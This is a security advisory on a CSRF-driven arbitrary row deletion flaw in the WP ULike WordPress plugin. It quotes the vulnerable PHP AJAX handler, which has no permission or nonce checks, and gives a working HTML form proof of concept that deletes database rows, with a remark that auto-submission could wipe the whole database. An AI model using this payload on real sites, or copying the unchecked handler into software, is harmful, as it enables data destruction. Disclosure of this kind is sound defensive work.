@@ -1,0 +1,71 @@
+id: 30351
+date: 05/15/2018
+title: WordPress WP ULike 2.8.1 / 3.1 Arbitrary Data Deletion Vulnerability
+author: Tom Adams
+cves: 
+
+Details
+================
+Software: WP ULike
+Version: 2.8.1,3.1
+Homepage: https://wordpress.org/plugins/wp-ulike/
+Advisory report: https://advisories.dxw.com/advisories/wp-ulike-delete-rows/
+CVE: Awaiting assignment
+CVSS: 5.8 (Medium; AV:N/AC:M/Au:N/C:N/I:P/A:P)
+
+Description
+================
+WP ULike allows anybody to delete any row in any WordPress table
+
+Vulnerability
+================
+The plugin contains a wp_ajax action which allows any authenticated user (it doesnat check permissions) to delete any row of almost any table in the database (the table must begin with $wpdb->prefix). As nonces are not used, this is also vulnerable to CSRF meaning unauthenticated users can access it if they can successfully phish any user of the site.
+add_action(\'wp_ajax_ulikelogs\',\'wp_ulike_logs_process\');
+function wp_ulike_logs_process(){
+  global $wpdb;
+  $id = $_POST[\'id\'];
+  $table = $_POST[\'table\'];
+  $wpdb->delete( $wpdb->prefix.$table ,array( \'id\' => $id ));
+  wp_die();
+}
+This functionality should have a nonce, it should be restricted to users with certain permissions, and it should be restricted to only allow deleting from certain tables.
+
+Proof of concept
+================
+This is the proof-of-concept for an unauthenticated user using CSRF against a logged in user.
+
+Activate the plugin
+Remain signed in
+Visit a page containing the HTML below
+Press submit
+Row with id=1 in the $wpdb->prefix.\'posts\' table will be deleted
+The value of id or table can be changed allowing deleting any row in any table with the WordPress prefix at the start of its name, and having an id column
+
+<form method=\"POST\" action=\"http://localhost/wp-admin/admin-ajax.php\">
+ <input type=\"text\" name=\"action\" value=\"ulikelogs\">
+ <input type=\"text\" name=\"table\" value=\"posts\">
+ <input type=\"text\" name=\"id\" value=\"1\">
+ <input type=\"submit\">
+</form>
+In a real attack, the form could be made to auto-submit on page load, and submit the form multiple times with different table and id values meaning that a single user falling for a phish could wipe the whole database.
+
+Mitigations
+================
+Upgrade to version 3.2 or later.
+
+Disclosure policy
+================
+dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://security.dxw.com/disclosure/
+
+Please contact us on security@dxw.com to acknowledge this report if you received it via a third party (for example, plugins@wordpress.org) as they generally cannot communicate with us on your behalf.
+
+This vulnerability will be published if we do not receive a response to this report with 14 days.
+
+Timeline
+================
+
+2017-10-18: Discovered
+2018-04-16: Reported to plugin author via contact form
+2018-04-23: Vendor reported fixed in 3.2 (first reply)
+
+#  0day.today [2023-03-25]  #
